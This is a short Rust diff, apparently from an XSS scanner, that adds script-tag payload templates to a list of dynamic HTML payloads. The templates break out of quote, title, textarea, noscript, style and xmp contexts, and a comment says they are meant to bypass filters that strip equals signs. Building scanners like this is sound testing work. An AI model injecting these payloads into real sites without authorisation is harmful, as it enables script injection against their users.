@@ -77,6 +77,16 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "<math><mi onclick={JS} class={CLASS}>x</mi></math>",
         // Dialog element
         "<dialog open onclose={JS} class={CLASS}>",
+        // Equals-sign (=) stripping bypass templates (no attributes/equals signs)
+        "<script>{JS}</script>",
+        "\"><script>{JS}</script>",
+        "'><script>{JS}</script>",
+        "</script><script>{JS}</script>",
+        "</title><script>{JS}</script>",
+        "</textarea><script>{JS}</script>",
+        "</noscript><script>{JS}</script>",
+        "</style><script>{JS}</script>",
+        "</xmp><script>{JS}</script>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
